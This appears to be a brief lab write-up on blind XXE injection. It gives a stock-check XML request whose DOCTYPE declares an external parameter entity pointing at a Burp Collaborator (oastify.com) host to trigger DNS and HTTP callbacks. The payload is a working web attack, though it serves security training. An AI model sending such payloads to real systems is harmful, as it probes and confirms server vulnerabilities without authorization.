
Target Goal - Exploit blind XXE injection to issue a DNS lookup and HTTP request to Burp Collaborator.

Analysis:
Use burp collaborator

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://tpmbil1qxfhaset3rczxf9s.oastify.com"> %xxe;]>

<stockCheck>
	<productId>
	1
	</productId>
	<storeId>
	1
	</storeId>
</stockCheck>
```